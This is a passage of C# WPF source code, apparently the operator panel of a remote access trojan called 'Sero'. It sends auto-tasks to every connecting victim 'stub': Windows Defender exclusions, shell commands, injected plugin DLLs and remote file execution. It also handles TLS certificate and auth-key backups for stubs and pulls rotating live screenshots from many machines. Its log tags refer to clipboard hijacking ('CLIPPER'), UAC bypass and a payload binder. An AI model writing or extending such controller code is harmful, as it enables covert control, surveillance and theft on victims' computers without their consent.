                catch { }
            }));
    }

    public async Task ExecuteAutoTasksForClient(Data.ConnectedClient client, List<Data.AutoTaskEntry>? snapshot = null)
    {
        // snapshot must be captured on the UI thread before entering any Task.Run;
        // fall back to Dispatcher.InvokeAsync so background-thread callers are safe.
        var tasks = snapshot ?? await Dispatcher.InvokeAsync(() => _autoTasks.ToList());
        var executedNames = new System.Collections.Generic.List<string>();

        foreach (var task in tasks)
        {
            // Atomic check+add: lock prevents race between ExecuteAutoTasksForAllConnected
            // (UI thread) and ClientConnected Task.Run (thread pool) both seeing Contains=false
            // and both executing the same task → double-counting.
            bool alreadyDone;
            lock (task.ExecutedHwids)
                alreadyDone = !task.ExecutedHwids.Add(client.Hwid);
            if (alreadyDone) continue;

            // Skip admin-only tasks for non-admin clients
            if (task.AdminOnly && !client.IsAdmin)
            {
                lock (task.ExecutedHwids) task.ExecutedHwids.Remove(client.Hwid);
                continue;
            }

            try
            {
                Protocol.Packet packet;

                if (task.Type == Data.AutoTaskType.DefenderExclude)
                {
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.DefenderExclude,
                        Data = task.ShellCommand  // empty = stub uses its own install dir
                    };
                }
                else if (task.Type == Data.AutoTaskType.ShellCommand)
                {
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.AutoTaskShell,
                        Data = task.ShellCommand
                    };
                }
                else if (task.Type == Data.AutoTaskType.PluginExec)
                {
                    var data = new Protocol.PluginExecData
                    {
                        DllBase64  = task.FileBase64,
                        ExportName = "PluginMain"
                    };
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.PluginExec,
                        Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
                    };
                }
                else
                {
                    var data = new Protocol.RemoteFileExecData
                    {
                        FileName = task.FileName,
                        FileBase64 = task.FileBase64
                    };
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.RemoteFileExec,
                        Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
                    };
                }

                if (client.Stream == null) continue;
                if (!await client.WriteLock.WaitAsync(TimeSpan.FromSeconds(8))) continue;
                if (client.Stream == null) { client.WriteLock.Release(); continue; }
                try { await Protocol.Packet.WriteToStreamAsync(client.Stream, packet); }
                catch { lock (task.ExecutedHwids) task.ExecutedHwids.Remove(client.Hwid); throw; }
                finally { client.WriteLock.Release(); }
                Interlocked.Increment(ref task.ExecutionCountField);
                NotificationService.NotifyAutoTaskDone();
                executedNames.Add(task.FileName);
                // All Dispatcher calls are thread-safe — ExecuteAutoTasksForClient may run
                // from Task.Run (ClientConnected) or UI thread (ExecuteAutoTasksForAllConnected).
                _ = Dispatcher.BeginInvoke(() =>
                {
                    task.NotifyExecutionCount();
                    _autoTasksDirty = true;
                });

                await Task.Delay(100);
            }
            catch (Exception ex)
            {
                // Suppress noise when client already disconnected — ObjectDisposedException
                // and IOException both mean the socket closed (already logged as disconnect).
                if (client.Stream == null || ex is ObjectDisposedException || ex is System.IO.IOException) continue;
                var msg = ex.Message.Replace("\r\n", " ").Replace("\n", " ");
                _ = Dispatcher.BeginInvoke(() =>
                    Log($"[!] AutoTask: failed {task.FileName} on {client.Id}: {msg}"));
            }
        }

        // Single batch line instead of one per task
        if (executedNames.Count > 0)
        {
            var names = string.Join(", ", executedNames);
            _ = Dispatcher.BeginInvoke(() =>
                Log($"[+] AutoTask: {client.Id} ← {names}"));
        }
    }

    // ── Cert Setup / Export ─────────────────────────

    /// <summary>
    /// Shown on first launch — lets the user generate+save OR import an existing cert.
    /// </summary>
    private void ShowCertSetupDialog()
    {
        var dlg = new Window
        {
            Title = "Sero — TLS Certificate Setup",
            Width = 420, Height = 200,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            ResizeMode = ResizeMode.NoResize,
            Background = new SolidColorBrush(Color.FromRgb(24, 24, 24)),
            WindowStyle = WindowStyle.ToolWindow,
        };

        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(20) };

        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = "No TLS certificate found. Choose an option:",
            Foreground = Brushes.White,
            FontSize = 13,
            Margin = new Thickness(0, 0, 0, 16),
            TextWrapping = TextWrapping.Wrap,
        });

        var btnImport = new System.Windows.Controls.Button
        {
            Content = "Import backup or certificate (.sero / .pfx)…",
            Margin = new Thickness(0, 0, 0, 8),
            Padding = new Thickness(10, 6, 10, 6),
            HorizontalAlignment = HorizontalAlignment.Stretch,
        };
        var btnGen = new System.Windows.Controls.Button
        {
            Content = "Generate new certificate and save it…",
            Padding = new Thickness(10, 6, 10, 6),
            HorizontalAlignment = HorizontalAlignment.Stretch,
        };

        btnImport.Click += (_, _) => ImportCertOrBackup(() => dlg.Close());

        btnGen.Click += (_, _) =>
        {
            dlg.Close();
            var save = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "PFX Certificate (*.pfx)|*.pfx",
                FileName = "sero_cert.pfx",
                Title = "Choose where to save the certificate"
            };
            if (save.ShowDialog() != true) return;
            try
            {
                Net.CertificateHelper.GenerateAndExportTo(save.FileName);
                Log($"[+] Certificate generated and saved to {save.FileName}");
                try { BldCertHash.Text = Net.CertificateHelper.GetCertSha256Hash(); } catch { }
                MessageBox.Show(
                    $"Certificate saved:\n{save.FileName}\n\nNo password required to import it.",
                    "Sero — Certificate Ready", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex) { Log($"[!] Cert generation failed: {ex.Message}"); }
        };

        sp.Children.Add(btnImport);
        sp.Children.Add(btnGen);
        dlg.Content = sp;
        dlg.ShowDialog();
    }

    private void ExportBackup_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            var authKey = BldAuthKey.Text.Trim();
            if (string.IsNullOrEmpty(authKey))
            {
                MessageBox.Show(Lang.Get("BLD_AUTH_KEY_MSG"),
                    "Sero — No Auth Key", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            var dialog = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "Sero Backup (*.sero)|*.sero",
                FileName = "sero_backup.sero",
                Title = "Export Server Backup (cert + auth key)"
            };
            if (dialog.ShowDialog() != true) return;

            CertificateHelper.ExportServerBackup(dialog.FileName, authKey);
            Log($"[+] Server backup exported to {dialog.FileName}");
            SetStatus("Server backup exported.");
            MessageBox.Show(
                $"Backup exporté :\n{dialog.FileName}\n\nContient le certificat TLS et la clé d'auth.\nImportez ce fichier sur une autre machine pour que les clients reconnectent.",
                "Sero — Backup réussi", MessageBoxButton.OK, MessageBoxImage.Information);
        }
        catch (Exception ex)
        {
            Log($"[!] Backup export failed: {ex.Message}");
            MessageBox.Show(string.Format(Lang.Get("ERR_GENERIC"), ex.Message), Lang.Get("MSG_ERROR"), MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

    private void ImportBackup_Click(object sender, RoutedEventArgs e)
        => ImportCertOrBackup(null);

    private void ImportCertOrBackup(Action? onSuccess)
    {
        var open = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Sero Backup or Certificate (*.sero;*.pfx)|*.sero;*.pfx|All Files (*.*)|*.*",
            Title = "Import server backup (.sero) or certificate (.pfx)"
        };
        if (open.ShowDialog() != true) return;

        try
        {
            var path = open.FileName;
            var ext = System.IO.Path.GetExtension(path).ToLowerInvariant();

            if (ext == ".sero")
            {
                var restoredKey = CertificateHelper.ImportServerBackup(path);
                try { BldCertHash.Text = CertificateHelper.GetCertSha256Hash(); } catch { }

                if (!string.IsNullOrEmpty(restoredKey))
                {
                    BldAuthKey.Text = restoredKey;
                    BldAuthKey.IsReadOnly = true;
                    SaveConfig();
                }
                Log("[+] Server backup restored (cert + auth key).");
                SetStatus("Backup restored.");
                MessageBox.Show(
                    "Backup restauré.\nCertificat + clé d'auth restaurés.\nRedémarrez le serveur pour que les clients reconnectent.",
                    "Sero — Import réussi", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            else
            {
                try { CertificateHelper.ImportCertificate(path, null); }
                catch
                {
                    var pwd = PromptPassword("Ce certificat est protégé par un mot de passe.\nEntrez le mot de passe PFX :");
                    if (pwd == null) return;
                    CertificateHelper.ImportCertificate(path, pwd);
                }
                try { BldCertHash.Text = CertificateHelper.GetCertSha256Hash(); } catch { }
                Log("[+] Certificate imported.");
                SetStatus("Certificate imported.");
                MessageBox.Show(
                    "Certificat importé.\nATTENTION : la clé d'auth n'est pas incluse dans un .pfx.\nVérifiez que la clé d'auth dans le Builder correspond à celle de vos stubs.",
                    "Sero — Import cert", MessageBoxButton.OK, MessageBoxImage.Warning);
            }

            onSuccess?.Invoke();
        }
        catch (Exception ex)
        {
            Log($"[!] Import failed: {ex.Message}");
            MessageBox.Show(string.Format(Lang.Get("ERR_GENERIC"), ex.Message), Lang.Get("MSG_ERROR"), MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

    private void ExportCert_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            var dialog = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "PFX Certificate (*.pfx)|*.pfx",
                FileName = "sero_cert.pfx",
                Title = "Export TLS Certificate (cert only)"
            };

            if (dialog.ShowDialog() != true) return;

            CertificateHelper.ExportPfx(dialog.FileName);
            Log($"[+] Certificate exported to {dialog.FileName}");
            SetStatus("Certificate exported.");
            MessageBox.Show(
                $"Certificat exporté :\n{dialog.FileName}\n\nATTENTION : Ce fichier ne contient pas la clé d'auth.\nUtilisez 'Backup' pour exporter cert + clé d'auth ensemble.",
                "Sero — Export cert", MessageBoxButton.OK, MessageBoxImage.Warning);
        }
        catch (Exception ex)
        {
            Log($"[!] Export failed: {ex.Message}");
            MessageBox.Show(string.Format(Lang.Get("ERR_GENERIC"), ex.Message), Lang.Get("MSG_ERROR"), MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

    private static string? PromptPassword(string message)
    {
        var dlg = new Window
        {
            Title = "Certificate Password",
            Width = 350, Height = 150,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            ResizeMode = ResizeMode.NoResize,
            Background = new SolidColorBrush(Color.FromRgb(30, 30, 30))
        };
        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(12) };
        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = message, Foreground = Brushes.White, TextWrapping = TextWrapping.Wrap, Margin = new Thickness(0, 0, 0, 8)
        });
        var tb = new System.Windows.Controls.PasswordBox { Margin = new Thickness(0, 0, 0, 8) };
        sp.Children.Add(tb);
        var btn = new System.Windows.Controls.Button { Content = "OK", Width = 80, HorizontalAlignment = HorizontalAlignment.Right };
        string? result = null;
        btn.Click += (_, _) => { result = tb.Password; dlg.DialogResult = true; };
        sp.Children.Add(btn);
        dlg.Content = sp;
        tb.Focus();
        return dlg.ShowDialog() == true ? result : null;
    }

    // ── Logging ─────────────────────────────────────

    public static void LogGlobal(string msg)
    {
        if (Application.Current?.MainWindow is ServerWindow main)
        {
            if (main.Dispatcher.CheckAccess())
                main.Log(msg);
            else
                main.Dispatcher.BeginInvoke(() => main.Log(msg));
        }
    }

    private void Log(string msg)
    {
        if (TxtLogs == null) return; // called before XAML init completes
        _logLineCount++;

        // Mirror to diagnostic file — queue-based, zero lock contention on hot paths.
        DiagnosticLogger.Enqueue(msg);

        if (_logLineCount > LogMaxLines)
        {
            // Trim: clear the RichTextBox document and start fresh.
            TxtLogs.Document.Blocks.Clear();
            _logPara = null;
            _logLineCount = 0;
            var trimNote = new System.Windows.Documents.Run("[...older logs trimmed...]\n")
            { Foreground = _brushLogDefault };
            var p = EnsureLogParagraph();
            p.Inlines.Add(trimNote);
        }

        var para = EnsureLogParagraph();
        foreach (var (text, brush) in TokenizeLogEntry(msg))
        {
            var run = new System.Windows.Documents.Run(text) { Foreground = brush };
            para.Inlines.Add(run);
        }
    }

    private bool _autoScrollLogs = true;
    private void TxtLogs_ScrollChanged(object sender, ScrollChangedEventArgs e)
    {
        // If the user scrolled up manually, turn off auto-scroll.
        if (e.ExtentHeightChange == 0 && e.ViewportHeightChange == 0 && e.VerticalChange != 0)
        {
            _autoScrollLogs = (TxtLogs.VerticalOffset + TxtLogs.ViewportHeight >= TxtLogs.ExtentHeight - 10);
        }

        // If content size increased, or viewport changed (e.g. tab became visible),
        // and auto-scroll is enabled, force scroll to end.
        if (_autoScrollLogs && (e.ExtentHeightChange > 0 || e.ViewportHeightChange > 0))
        {
            TxtLogs.ScrollToEnd();
        }
    }

    private static readonly System.Text.RegularExpressions.Regex _logTokenRegex = new(
        @"(?<ip>\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)|(?<event>\b(?:connected|disconnected|failed|success|error)\b)|(?<client>\b(?:Client|client)\s+[A-Za-z0-9_-]+)|(?<user>\b[A-Za-z0-9_.-]+(?=@))",
        System.Text.RegularExpressions.RegexOptions.Compiled | System.Text.RegularExpressions.RegexOptions.IgnoreCase);
    private Brush _brushLogEvent  = MakeBrush(0x60, 0xA5, 0xFA); // blue-400
    private Brush _brushLogClient = MakeBrush(0xC4, 0xB5, 0xFD); // violet-300
    private Brush _brushLogUser   = MakeBrush(0x6E, 0xE7, 0xB7); // emerald-300

    private IEnumerable<(string text, Brush brush)> TokenizeLogEntry(string msg)
    {
        // Timestamp part
        var now = DateTime.Now;
        string timeFmt = (UiPrefs.GetInt("ShowSeconds", 0) == 1) ? "h:mm:ss tt" : "h:mm tt";
        yield return ($"[{now.ToString(timeFmt)}] ", _brushLogTime);

        // Determine base brush for the message body
        var bodyBrush = GetLogBrush(msg);

        // Check for tags that should get their own color
        string body = msg;
        if (body.StartsWith("[!]"))
        {
            yield return ("[!]", _brushLogError);
            body = body[3..];
        }
        else if (body.StartsWith("[+]"))
        {
            yield return ("[+]", _brushLogSuccess);
            body = body[3..];
        }
        else if (body.StartsWith("[*]"))
        {
            yield return ("[*]", _brushLogDefault);
            body = body[3..];
        }
        else if (body.StartsWith("[ADMIN]"))
        {
            yield return ("[ADMIN]", _brushLogAdmin);
            body = body[7..];
        }
        else if (body.StartsWith("[CLIPPER]"))
        {
            yield return ("[CLIPPER]", _brushLogTask);
            body = body[9..];
        }
        else if (body.StartsWith("[UAC]"))
        {
            yield return ("[UAC]", _brushLogTask);
            body = body[5..];
        }
        else if (body.StartsWith("[WATCHDOG]"))
        {
            yield return ("[WATCHDOG]", _brushLogError);
            body = body[10..];
        }
        else if (body.StartsWith("[RATE]"))
        {
            yield return ("[RATE]", _brushLogError);
            body = body[6..];
        }
        else if (body.StartsWith("[AUTH]"))
        {
            yield return ("[AUTH]", _brushLogError);
            body = body[6..];
        }
        else if (body.StartsWith("[LIMIT]"))
        {
            yield return ("[LIMIT]", _brushLogError);
            body = body[7..];
        }
        else if (body.StartsWith("[AT:"))
        {
            int end = body.IndexOf(']');
            if (end > 0)
            {
                yield return (body[..(end + 1)], _brushLogTask);
                body = body[(end + 1)..];
            }
        }
        else if (body.StartsWith("[-]"))
        {
            yield return ("[-]", _brushLogDisconnect);
            body = body[3..];
        }

        // Extract tokens (IP, Event, Client ID, Username) from the remaining body and color them
        int lastIdx = 0;
        foreach (System.Text.RegularExpressions.Match match in _logTokenRegex.Matches(body))
        {
            if (match.Index > lastIdx)
                yield return (body[lastIdx..match.Index], bodyBrush);

            Brush tokenBrush = bodyBrush;
            if (match.Groups["ip"].Success) tokenBrush = _brushLogIP;
            else if (match.Groups["event"].Success) tokenBrush = _brushLogEvent;
            else if (match.Groups["client"].Success) tokenBrush = _brushLogClient;
            else if (match.Groups["user"].Success) tokenBrush = _brushLogUser;

            yield return (match.Value, tokenBrush);
            lastIdx = match.Index + match.Length;
        }
        if (lastIdx < body.Length)
            yield return (body[lastIdx..], bodyBrush);

        yield return ("\n", _brushLogDefault);
    }

    private void LogAdminAction(string friendlyName, int clientCount, string firstClientId)
    {
        if (clientCount == 1)
        {
            Log($"[ADMIN] {friendlyName} opened for client {firstClientId}.");
        }
        else
        {
            Log($"[ADMIN] {friendlyName} opened for {clientCount} clients.");
        }
    }

    private void LogsTab_Selected()
    {
    }

    private System.Windows.Documents.Paragraph EnsureLogParagraph()
    {
        if (_logPara == null)
        {
            _logPara = new System.Windows.Documents.Paragraph { Margin = new Thickness(0) };
            TxtLogs.Document.Blocks.Add(_logPara);
        }
        return _logPara;
    }

    private Brush GetLogBrush(string msg)
    {
        // 1. Error / Warning / Alarm
        if (msg.Contains("[!]") ||
            msg.Contains("[WATCHDOG]") || 
            msg.Contains("[RATE]") ||
            msg.Contains("[AUTH]") || 
            msg.Contains("[LIMIT]") ||
            msg.Contains("FAILED"))
        {
            return _brushLogError;
        }

        // 2. Admin Action
        if (msg.Contains("[ADMIN]"))
        {
            return _brushLogAdmin;
        }

        // 3. Client Connected
        if (msg.Contains("connected (") || msg.Contains("connected successfully"))
        {
            return _brushLogConnect;
        }

        // 4. Client Disconnected
        if (msg.Contains("disconnected.") || msg.Contains("disconnecting zombie"))
        {
            return _brushLogDisconnect;
        }

        // 5. Task Event / Operation / DLL
        if (msg.Contains("[CLIPPER]") ||
            msg.Contains("[AT:") ||
            msg.Contains("[UAC]") ||
            msg.Contains("dll", StringComparison.OrdinalIgnoreCase) ||
            msg.Contains("[DLL]"))
        {
            return _brushLogTask;
        }

        // 6. Success
        if (msg.Contains("[+]"))
        {
            return _brushLogSuccess;
        }

        // 7. Neutral info
        if (msg.Contains("[*]"))
        {
            return _brushLogDefault;
        }

        return _brushLogDefault;
    }

    // ── Window Controls ─────────────────────────────

    private void Window_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed && !_isFullscreen && WindowState != WindowState.Maximized)
            DragMove();
    }

    protected override void OnStateChanged(EventArgs e)
    {
        base.OnStateChanged(e);
        bool nowMaximized = WindowState == WindowState.Maximized;
        bool nowNormal    = WindowState == WindowState.Normal;

        if (nowMaximized && !_isFullscreen)
        {
            // Layout hasn't updated yet — ActualWidth is still the pre-maximize value.
            _premaximizeOnlineGridWidth      = GridClients.ActualWidth;
            _premaximizeAllClientsGridWidth  = GridAllClients?.ActualWidth ?? 0;
            _isFullscreen = true;
            BeginColumnTransition(BuildTransitionTargets(1.0, 1.0));
        }
        else if (nowNormal && _isFullscreen)
        {
            _isFullscreen = false;
            if (_premaximizeOnlineGridWidth > 50)
            {
                double tO = ComputeAdaptiveT(_premaximizeOnlineGridWidth, 1546.0, 1077.0);
                // If AllClients tab was never visited its ActualWidth is 0 — default to full (t=1.0).
                double tA = _premaximizeAllClientsGridWidth > 50
                    ? ComputeAdaptiveT(_premaximizeAllClientsGridWidth, 1004.0, 763.0)
                    : 1.0;
                BeginColumnTransition(BuildTransitionTargets(tO, tA));
            }
            else
            {
                Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, new Action(() =>
                {
                    ApplyAdaptiveOnlineWidths();
                    ApplyAdaptiveAllClientsWidths();
                }));
            }
        }
    }

    private void Minimize_Click(object sender, RoutedEventArgs e) => WindowState = WindowState.Minimized;

    private bool _isFullscreen;

    // Grid widths captured the moment the user maximizes (before layout updates),
    // so we can animate columns back to the exact right sizes on restore.
    private double _premaximizeOnlineGridWidth;
    private double _premaximizeAllClientsGridWidth;

    // Column transition animation state
    private System.Windows.Threading.DispatcherTimer?                          _colAnimTimer;
    private DateTime                                                            _colAnimStart;
    private List<(DataGridColumn col, double from, double to, bool isOnline)>? _colAnimList;
    private const double ColAnimMs = 160;
    private static double ColEase(double t) => 1 - (1 - t) * (1 - t); // quadratic ease-out

    private void Fullscreen_Click(object sender, RoutedEventArgs e)
    {
        WindowState = WindowState == WindowState.Maximized ? WindowState.Normal : WindowState.Maximized;
    }

    // ── Screen tab ─────────────────────────────────────────────────────────────

    private DispatcherTimer? _screenTimer;
    private DispatcherTimer? _screenFastTimer;
    private string? _focusedScreenId;
    private System.Threading.CancellationTokenSource? _screenFocusCancelCts;
    private readonly Dictionary<string, System.Windows.Controls.Image>  _screenTiles   = new();
    private readonly Dictionary<string, System.Windows.Controls.Border> _screenBorders = new();
    private readonly HashSet<string> _screenHandlers = new();
    // Reused WriteableBitmap per tile — avoids allocating a new WIC texture every frame
    private readonly Dictionary<string, System.Windows.Media.Imaging.WriteableBitmap> _tileWb = new();
    private static readonly System.Threading.SemaphoreSlim _screenshotDecodeSlots =
        new(Math.Max(2, Environment.ProcessorCount / 2), Math.Max(2, Environment.ProcessorCount / 2));
    private int _screenRoundRobinOffset;
    private const int ScreenMaxPerTick = 50;

    // ── Binder ──────────────────────────────────────────────────────────
    private readonly ObservableCollection<SeroServer.Binder.BinderEntry> _binderEntries = [];
    private string? _binderIconPath;

    private void ScreenStart_Click(object sender, RoutedEventArgs e)
    {
        if (_server == null) return;
        BtnScreenStart.IsEnabled = false; BtnScreenStart.Opacity = 0.35;
        BtnScreenStop.IsEnabled  = true;  BtnScreenStop.Opacity  = 1.0;

        _screenTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(3) };
        _screenTimer.Tick += (_, _) => RequestScreenshots();
        _screenTimer.Start();
        RequestScreenshots();
    }

    private void ScreenStop_Click(object sender, RoutedEventArgs e)
    {
        _screenTimer?.Stop(); _screenTimer = null;
        ClearScreenFocus();
        BtnScreenStart.IsEnabled = true;  BtnScreenStart.Opacity = 1.0;
        BtnScreenStop.IsEnabled  = false; BtnScreenStop.Opacity  = 0.35;
        foreach (var id in _screenHandlers.ToList())
            _server?.UnregisterHandler(id, PacketType.ScreenshotResult);
        _screenHandlers.Clear();
    }

    private void SetScreenFocus(string clientId)
    {
        if (_focusedScreenId == clientId) return;
        _focusedScreenId = clientId;
        _screenFastTimer?.Stop();
        _screenFastTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(150) };
        _screenFastTimer.Tick += (_, _) => RequestFocusedScreenshot();
        _screenFastTimer.Start();
        RequestFocusedScreenshot();
    }

    private void ClearScreenFocus()
    {
        _focusedScreenId = null;
        _screenFastTimer?.Stop();
        _screenFastTimer = null;
    }

    private void RequestFocusedScreenshot()
    {
        if (_server == null || _focusedScreenId == null) return;
        if (!_server.ConnectedClients.ContainsKey(_focusedScreenId))
        {
            Dispatcher.BeginInvoke(ClearScreenFocus);
            return;
        }
        _ = _server.SendToClient(_focusedScreenId, new Packet { Type = PacketType.Screenshot });
    }

    private void RequestScreenshots()
    {
        if (_server == null) return;
        var clients = _server.ConnectedClients.Values.ToList();

        // Remove tiles for disconnected clients
        var ids = clients.Select(c => c.Id).ToHashSet();
        foreach (var key in _screenTiles.Keys.Where(k => !ids.Contains(k)).ToList())
        {
            if (key == _focusedScreenId) ClearScreenFocus();
            if (_screenTiles[key].Parent is System.Windows.FrameworkElement fe)
            {
                var panel = VisualTreeHelperGetParent(fe);
                if (panel is System.Windows.Controls.Primitives.UniformGrid ug) ug.Children.Remove(fe);
            }
            _screenTiles.Remove(key);
            _screenBorders.Remove(key);
            _tileWb.Remove(key);
        }

        int total = clients.Count;
        if (total == 0) return;

        // Stagger: send to at most ScreenMaxPerTick clients per tick, rotating across all
        // so 200 clients at 50/tick × 3s = each client refreshed every ~12s max
        _screenRoundRobinOffset %= total;
        int count = Math.Min(ScreenMaxPerTick, total);
        for (int i = 0; i < count; i++)
        {
            var client = clients[(_screenRoundRobinOffset + i) % total];
            EnsureScreenTile(client);
            if (!_screenHandlers.Contains(client.Id))
            {
                var id = client.Id;
                _server.RegisterHandler(id, PacketType.ScreenshotResult,
                    pkt => OnScreenshotResult(id, pkt.Data));
                _screenHandlers.Add(id);
            }
            _ = _server.SendToClient(client.Id, new Packet { Type = PacketType.Screenshot });
        }
        _screenRoundRobinOffset = (_screenRoundRobinOffset + count) % total;
    }

    private static System.Windows.DependencyObject? VisualTreeHelperGetParent(
        System.Windows.DependencyObject obj)
        => System.Windows.Media.VisualTreeHelper.GetParent(obj);

    private double _tileImgHeight = 140;

    private void EnsureScreenTile(ConnectedClient client)
    {
        if (_screenTiles.ContainsKey(client.Id)) return;

        var img = new System.Windows.Controls.Image
        {
            Stretch = Stretch.Uniform,
            Height  = _tileImgHeight,
            HorizontalAlignment = HorizontalAlignment.Stretch
        };

        string displayName = !string.IsNullOrEmpty(client.Tag)
            ? client.Tag
            : string.IsNullOrEmpty(client.Username)
                ? client.Id
                : $"{client.Username}@{client.MachineName}".Trim('@');

        var lblName = new TextBlock
        {
            Text = displayName,
            FontSize = 10,
            Margin = new Thickness(6, 3, 6, 0),
            TextTrimming = System.Windows.TextTrimming.None,
            TextWrapping = System.Windows.TextWrapping.Wrap
        };
        lblName.SetResourceReference(TextBlock.ForegroundProperty, "ContentTextBrush");

        var lblId = new TextBlock
        {
            Text = client.Id,
            FontSize = 9,
            FontFamily = new System.Windows.Media.FontFamily("Consolas"),
            Margin = new Thickness(6, 1, 6, 4),
            TextTrimming = System.Windows.TextTrimming.None,
            TextWrapping = System.Windows.TextWrapping.NoWrap
        };
        lblId.SetResourceReference(TextBlock.ForegroundProperty, "FieldLabelBrush");

        var labelStack = new System.Windows.Controls.StackPanel { Orientation = System.Windows.Controls.Orientation.Vertical };
        labelStack.Children.Add(lblName);
        labelStack.Children.Add(lblId);

        var dp = new System.Windows.Controls.DockPanel();
        System.Windows.Controls.DockPanel.SetDock(labelStack, System.Windows.Controls.Dock.Bottom);
        dp.Children.Add(labelStack);
        dp.Children.Add(img);

        var scaleT = new System.Windows.Media.ScaleTransform(1.0, 1.0);
        var border = new System.Windows.Controls.Border
        {
            Margin                  = new Thickness(3),
            BorderThickness         = new Thickness(1),
            CornerRadius            = new System.Windows.CornerRadius(5),
            Cursor                  = System.Windows.Input.Cursors.Hand,
            Child                   = dp,
            RenderTransform         = scaleT,
            RenderTransformOrigin   = new System.Windows.Point(0.5, 0.5),
        };
        border.SetResourceReference(System.Windows.Controls.Border.BackgroundProperty, "SectionBgBrush");
        border.SetResourceReference(System.Windows.Controls.Border.BorderBrushProperty, "InputBorderBrush");

        System.Windows.Media.Animation.DoubleAnimation TileScaleAnim(double to) =>
            new(to, TimeSpan.FromMilliseconds(160))
            {
                EasingFunction = new System.Windows.Media.Animation.CubicEase
                    { EasingMode = System.Windows.Media.Animation.EasingMode.EaseOut }
            };

        // ── Hover highlight + scale + click-to-popup ────────────────────────
        var capturedId    = client.Id;
        var capturedClient = client;

        border.MouseEnter += (_, _) =>
        {
            if (TryFindResource("AccentBrush") is System.Windows.Media.Brush accent)
                border.BorderBrush = accent;
            System.Windows.Controls.Panel.SetZIndex(border, 10);
            scaleT.BeginAnimation(System.Windows.Media.ScaleTransform.ScaleXProperty, TileScaleAnim(1.04));
            scaleT.BeginAnimation(System.Windows.Media.ScaleTransform.ScaleYProperty, TileScaleAnim(1.04));
            _screenFocusCancelCts?.Cancel();
            _screenFocusCancelCts = null;
            SetScreenFocus(capturedId);
        };
        border.MouseLeave += (_, _) =>
        {
            border.SetResourceReference(System.Windows.Controls.Border.BorderBrushProperty, "InputBorderBrush");
            System.Windows.Controls.Panel.SetZIndex(border, 0);
            scaleT.BeginAnimation(System.Windows.Media.ScaleTransform.ScaleXProperty, TileScaleAnim(1.0));
            scaleT.BeginAnimation(System.Windows.Media.ScaleTransform.ScaleYProperty, TileScaleAnim(1.0));
            _screenFocusCancelCts?.Cancel();
            var cts = new System.Threading.CancellationTokenSource();
            _screenFocusCancelCts = cts;
            System.Threading.Tasks.Task.Delay(300, cts.Token).ContinueWith(t =>
            {
                if (!t.IsCanceled) Dispatcher.BeginInvoke(ClearScreenFocus);
            }, System.Threading.Tasks.TaskScheduler.Default);
        };
        border.MouseLeftButtonDown += (_, e) =>
        {
            e.Handled = true;
            if (_server?.ConnectedClients.ContainsKey(capturedId) != true) return;
            OpenFeatureWindow<RemoteDesktopWindow>(capturedId, () =>
            {
                var w = new RemoteDesktopWindow(_server!, capturedId);
                w.Owner = this;
                return w;
            });
        };

        ScreenPanel.Children.Add(border);
        _screenTiles[client.Id]   = img;
        _screenBorders[client.Id] = border;
    }

    private void ScreenScroll_Loaded(object sender, RoutedEventArgs e)
    {
        // SizeChanged fires with ViewportWidth=0 during the first layout pass and exits early.
        // Re-run after the layout is settled so tiles get their correct initial sizing.
        Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background,
            () => ScreenScroll_SizeChanged(sender, null!));
    }

    private void ScreenScroll_SizeChanged(object sender, SizeChangedEventArgs e)
    {
        var sv = (System.Windows.Controls.ScrollViewer)sender;
        double avail = sv.ViewportWidth - 8 - 144; // 144 = 2×72px side margin (room for 1.45x scale overflow)
        if (avail <= 0) return;

        int cols = Math.Max(2, (int)(avail / 220));
        ScreenPanel.Columns = cols;

        double tileW = avail / cols - 6; // subtract tile margin
        double imgH  = Math.Round(tileW * 9.0 / 16.0);
        _tileImgHeight = imgH;

        foreach (var img in _screenTiles.Values)
            img.Height = imgH;
    }

    private void OnScreenshotResult(string clientId, string json)
    {
        try
        {
            var result = Newtonsoft.Json.JsonConvert.DeserializeObject<ScreenshotResultData>(json);
            if (result == null || string.IsNullOrEmpty(result.Data)) return;
            var b64 = result.Data;

            // Decode JPEG off the UI thread with a slot cap, blit pixels into reused WriteableBitmap.
            // ArrayPool<byte> avoids allocating a fresh ~4-8 MB buffer per screenshot decode.
            System.Threading.Tasks.Task.Run(async () =>
            {
                await _screenshotDecodeSlots.WaitAsync();
                byte[]? pixels = null;
                try
                {
                    var bytes = Convert.FromBase64String(b64);
                    using var ms = new System.IO.MemoryStream(bytes);
                    var decoder = System.Windows.Media.Imaging.BitmapDecoder.Create(
                        ms,
                        System.Windows.Media.Imaging.BitmapCreateOptions.None,
                        System.Windows.Media.Imaging.BitmapCacheOption.OnLoad);
                    var frame = decoder.Frames[0];
                    var src = new System.Windows.Media.Imaging.FormatConvertedBitmap(
                        frame, System.Windows.Media.PixelFormats.Bgr32, null, 0);
                    src.Freeze();
